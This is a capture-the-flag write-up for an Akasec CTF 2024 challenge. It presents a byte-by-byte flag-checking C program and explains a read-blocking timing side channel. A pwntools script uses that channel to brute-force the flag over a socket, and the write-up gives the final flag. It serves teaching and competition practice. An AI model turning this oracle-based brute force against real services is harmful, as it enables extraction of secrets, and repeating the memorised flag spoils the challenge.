
# Description

![](./media/Screenshot%202024-06-10%20at%2016-05-16%20Akasec%20CTF%202024.png)

## ATTACHEMENT:
```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
	char input[1];
	char buffer[1024];
	int bytes;
	int correct = 1;
	
	const char *flag = getenv("FLAG");
	if (!flag) {
		flag = "AKASEC{this_is_just_a_fake_flag}";
	}

	fflush(stdin);
	fflush(stdout);
	write(1, "Can you guess the correct flag?\nFlag: ", 38);

	for (size_t i = 0; i < strlen(flag); i++) {
		bytes = read(0, input, 1);
		if (bytes == -1)
			return (perror("read"), 1);
		if (bytes == 0) // ctrl+d
			break;
		if (flag[i] != input[0]) {
			correct = 0;
			break;
		}
	}
	
	// reading rest of input
	while (input[0] != '\n' || bytes == 0) {
		bytes = read(0, buffer, 1024);
		if (bytes < 1024)
			break;
	}

	if (correct)
		printf("Access Granted\n");
	else
		printf("Access Denied\n");

	return 0;
```

this code read byte by byte from `stdin` and then compare each byte with the corresponding byte in `flag`, after that it clears the buffer and write `access Denied` or `access Granted` according to value of `correct`


# solution

the solution here is to brute force the flag byte by byte, to do this we can use the loop that clears the buffer to know if the character is correct or not, here's an example:

if we provide as input a character x followed by 1024 random (it shouldn't be part of the flag) bytes, the program will first read x then we have two possibilities here:
- x is correct then it'll move to the next byte (which should be incorrect) then exit form the loop, the size of the buffer will now be 1023 bytes so the loop that clears the buffer will finish after one read.
![](./media/Screen%20Shot%202024-06-10%20at%206.35.10%20PM.png)

- x is incorrect, the loop will exit and the size of the buffer will be 1024 bytes, so the loop that clears the buffer will block in the second read
![](./media/Screen%20Shot%202024-06-10%20at%206.37.28%20PM.png)

we can use this to brute force flag byte by byte!

```py
from pwn import *
import time

payload = list('.' * 1023)

printable = """0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~ """

def remote_is_connected(p):
        recvd = p.recv(timeout=0.1)
        if len(recvd) == 0:
                return True
        else:
                return False

def solve():
        flag = ""
        keep = 1
        i = 0
        while keep:
                keep = 0
                payload.append(".")
                for letter in printable:
                        p = remote("localhost", 4448)
                        time.sleep(0.1)
                        p.recv()
                        payload[i] = letter
                        p.sendline("".join(payload).encode())
                        if not remote_is_connected(p):
                                keep = 1
                                print(letter)
                                flag += letter
                                break

                        p.close()
                i += 1
        return flag

if __name__ == "__main__":
        with context.quiet:
                res = solve()

        print("-------------")
        print(res)
```

Note: you may need to adjust `time.sleep` because of connection delay

flag: `AKASEC{why_d035_r34d_bl0ck_h3r3!!!}`
